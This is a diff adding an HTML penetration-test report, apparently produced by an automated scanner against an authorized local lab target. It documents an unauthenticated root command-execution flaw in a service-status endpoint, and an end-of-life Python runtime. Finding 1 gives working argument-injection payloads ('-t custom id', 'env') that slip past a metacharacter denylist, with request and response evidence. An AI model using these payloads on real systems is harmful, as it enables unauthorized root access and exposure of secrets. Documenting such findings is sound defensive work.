@@ -1,0 +1,348 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqyrjjjm-vd71fe</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Unauthenticated remote command execution as root via /check_service custom type</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] End-of-life Python runtime — Python 3.8.20 (EOL 2024-10-07, no further security patches)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqyrjjjm-vd71fe</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32851/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T05:14:22.500Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>1 mapped · 1 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>2</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32851</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>2 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#f57c00">1</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] Unauthenticated remote command execution as root via /check_service custom type</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32851/</div>
+<div class="desc">POST /check_service passes the JSON `service_name` field to a backend shell script `check_service.sh` as command-line argv (word-split). A denylist rejects shell metacharacters (`; | &amp; $ ( ) { }` -&gt; HTTP 400 &quot;Invalid service name&quot;), so naive command injection is blocked. However the denylist permits spaces and hyphens, letting an unauthenticated attacker smuggle the script's OWN `-t custom &lt;command&gt;` option inside the service_name value. The script's &quot;custom&quot; mode then executes the supplied command and returns its stdout inside the JSON `status` field. Commands run as ROOT (uid=0). Example: {&quot;service_name&quot;:&quot;-t custom id&quot;} -&gt; status &quot;uid=0(root) gid=0(root) groups=0(root)&quot;. This is full unauthenticated RCE as root on the host/container. The exit status is also leaked as a true/false boolean oracle, and argument-free commands (id, whoami, env, hostname, uname) return output directly.</div>
+<div><b>Reproduction</b></div><pre>1. Negative control: POST /check_service {&quot;service_name&quot;:&quot;apache2$(id)&quot;} -&gt; HTTP 400 {&quot;error&quot;:&quot;Invalid service name&quot;} (metacharacter injection blocked). 2. Exploit: POST /check_service {&quot;service_name&quot;:&quot;-t custom id&quot;} -&gt; HTTP 200 {&quot;service_name&quot;:&quot;-t custom id&quot;,&quot;status&quot;:&quot;uid=0(root) gid=0(root) groups=0(root)\ntrue&quot;} -&gt; arbitrary command executed as root, stdout returned. 3. Replay is stable/identical. 4. {&quot;service_name&quot;:&quot;-t custom whoami&quot;} -&gt; &quot;root&quot;; {&quot;service_name&quot;:&quot;-t custom env&quot;} dumps the process environment.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqys6wn0-27</code> — <code>artifacts/_/ev-mqys6wn0-27/</code></div><div class="lbl">REQUEST</div><pre>POST /check_service HTTP/1.1
+Host: target.local:32851
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;service_name&quot;:&quot;apache2$(id)&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 400
+connection: close
+content-length: 33
+content-type: application/json
+date: Mon, 29 Jun 2026 05:32:32 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+{&quot;error&quot;:&quot;Invalid service name&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqys905k-2d</code> — <code>artifacts/_/ev-mqys905k-2d/</code></div><div class="lbl">REQUEST</div><pre>POST /check_service HTTP/1.1
+Host: target.local:32851
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;service_name&quot;:&quot;-t custom id&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 88
+content-type: application/json
+date: Mon, 29 Jun 2026 05:34:10 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+{&quot;service_name&quot;:&quot;-t custom id&quot;,&quot;status&quot;:&quot;uid=0(root) gid=0(root) groups=0(root)\ntrue&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqys9v71-2f</code> — <code>artifacts/_/ev-mqys9v71-2f/</code></div><div class="lbl">REQUEST</div><pre>POST /check_service HTTP/1.1
+Host: target.local:32851
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;service_name&quot;:&quot;-t custom id&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 88
+content-type: application/json
+date: Mon, 29 Jun 2026 05:34:50 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+{&quot;service_name&quot;:&quot;-t custom id&quot;,&quot;status&quot;:&quot;uid=0(root) gid=0(root) groups=0(root)\ntrue&quot;}</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 2. [vulnerable-component] End-of-life Python runtime — Python 3.8.20 (EOL 2024-10-07, no further security patches)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32851/</div>
+<div class="desc">The HTTP `Server` response header discloses the backend runtime as `Werkzeug/3.0.6 Python/3.8.20`. Python 3.8 reached **end-of-life on 2024-10-07**, and **3.8.20 (released 2024-09-06) was the final release** of the 3.8 series. CPython 3.8 now receives **no security fixes whatsoever** — any vulnerability disclosed in the standard library or interpreter after the EOL date (e.g. tarfile/email/http.cookies/asyncio-class DoS and parsing issues that continue to be patched in 3.9+) remains permanently unpatched on this host. This is a **VERSION-BASED finding**: it was matched from the `Server` banner (fingerprint), not exploited — no specific post-EOL CVE was actively triggered. The operator should confirm the running interpreter version and plan an upgrade to a supported branch (3.11/3.12/3.13). Recommendation: upgrade Python to a maintained release; additionally, the banner indicates the app is being served by the **Werkzeug built-in development server**, which is not intended for production exposure and should be fronted by a real WSGI server (gunicorn/uWSGI) with the version banner suppressed. Note Werkzeug 3.0.6 itself is current enough that its known CVEs (CVE-2024-49766, CVE-2024-49767) are already fixed in that release, so the runtime EOL is the actionable component issue.</div>
+<div><b>Reproduction</b></div><pre>1. Send `GET /` to http://target.local:32851/ and inspect response headers.
+2. Observe `Server: Werkzeug/3.0.6 Python/3.8.20` (revealed via fingerprint_scan; recorded in evidence ev-mqyshzy6-2u and ev-mqysje8f-2v, both 200, 2909 bytes, stable across replays).
+3. Cross-reference Python release calendar: 3.8 EOL = 2024-10-07; 3.8.20 = final 3.8 release. The disclosed version therefore receives no further security updates.
+Negative control ev-mqysjeyq-2w: GET /verdict-nonexistent-9f3a → 404 (207 bytes), distinguishable from the 200 root responses.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqysjeyq-2w</code> — <code>artifacts/_/ev-mqysjeyq-2w/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-9f3a HTTP/1.1
+Host: target.local:32851
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 05:42:15 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyshzy6-2u</code> — <code>artifacts/_/ev-mqyshzy6-2u/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32851
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 2909
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 05:41:09 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Service Status Dashboard&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        #service-container {
+            width: 80%;
+            max-width: 600px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .service {
+            padding: 10px 20px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .red {
+            background-color: #ffdddd;
+            color: #d04437;
+        }
+
+        .green {
+            background-color: #ddffdd;
+            color: #4a934a;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div id=&quot;service-container&quot;&gt;
+        &lt;div id=&quot;apache&quot; class=&quot;service&quot;&gt;Apache: Loading...&lt;/div&gt;
+        &lt;div id=&quot;mysql&quot; class=&quot;service&quot;&gt;MySQL: Loading...&lt;/div&gt;
+        &lt;div id=&quot;nginx&quot; class=&quot;service&quot;&gt;Nginx: Loading...&lt;/div&gt;
+        &lt;div id=&quot;ssh&quot; class=&quot;service&quot;&gt;SSH: Loading...&lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        document.addEventListener(&quot;DOMContentLoaded&quot;, function() {
+            const services = ['apache', 'mysql', 'nginx', 'ssh'];
+
+            services.forEach(service =&gt; {
+                fetch('/check_service', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ service_name: service })
+                })
+                .then(response =&gt; response.json())
+                .then(data =&gt; {
+                    const element = document.getElementById(service);
+                    if (data.status === &quot;true&quot;) {
+                        element.classList.add('green');
+                        element.textContent = service.toUpperCase() + &quot;: Running&quot;;
+                    } else {
+                        element.classList.add('red');
+                        element.textContent = service.toUpperCase() + &quot;: Stopped&quot;;
+                    }
+                })
+                .catch(error =&gt; {
+                    console.error('Error:', error);
+                    const element = document.getElementById(service);
+                    element.textContent = service.toUpperCase() + &quot;: Error&quot;;
+                });
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqysje8f-2v</code> — <code>artifacts/_/ev-mqysje8f-2v/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32851
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 2909
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 05:42:14 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Service Status Dashboard&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        #service-container {
+            width: 80%;
+            max-width: 600px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .service {
+            padding: 10px 20px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .red {
+            background-color: #ffdddd;
+            color: #d04437;
+        }
+
+        .green {
+            background-color: #ddffdd;
+            color: #4a934a;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div id=&quot;service-container&quot;&gt;
+        &lt;div id=&quot;apache&quot; class=&quot;service&quot;&gt;Apache: Loading...&lt;/div&gt;
+        &lt;div id=&quot;mysql&quot; class=&quot;service&quot;&gt;MySQL: Loading...&lt;/div&gt;
+        &lt;div id=&quot;nginx&quot; class=&quot;service&quot;&gt;Nginx: Loading...&lt;/div&gt;
+        &lt;div id=&quot;ssh&quot; class=&quot;service&quot;&gt;SSH: Loading...&lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        document.addEventListener(&quot;DOMContentLoaded&quot;, function() {
+            const services = ['apache', 'mysql', 'nginx', 'ssh'];
+
+            services.forEach(service =&gt; {
+                fetch('/check_service', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ service_name: service })
+                })
+                .then(response =&gt; response.json())
+                .then(data =&gt; {
+                    const element = document.getElementById(service);
+                    if (data.status === &quot;true&quot;) {
+                        element.classList.add('green');
+                        element.textContent = service.toUpperCase() + &quot;: Running&quot;;
+                    } else {
+                        element.classList.add('red');
+                        element.textContent = service.toUpperCase() + &quot;: Stopped&quot;;
+                    }
+                })
+                .catch(error =&gt; {
+                    console.error('Error:', error);
+                    const element = document.getElementById(service);
+                    element.textContent = service.toUpperCase() + &quot;: Error&quot;;
+                });
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
